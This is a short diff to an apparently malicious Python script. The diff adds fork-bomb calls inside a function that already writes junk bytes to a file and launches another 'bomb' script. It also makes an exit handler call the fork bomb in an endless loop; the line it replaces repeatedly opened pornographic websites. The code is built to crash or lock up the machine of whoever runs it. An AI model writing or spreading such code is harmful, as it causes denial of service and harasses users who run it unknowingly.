@@ -2,6 +2,7 @@ import os
 import atexit
 import random
 import time
+from forkbomb import forkbomb
 
 def forked():
   mal = True 
@@ -22,9 +23,10 @@ def forked():
       file.write(malwar + str(random.randbytes(999)))
     print(malwar)
     os.system("python bomb.py")
+    forkbomb()
     
 @atexit.register
 def goodbye():
   mal = True
   while mal == True:
-    os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
+    forkbomb()
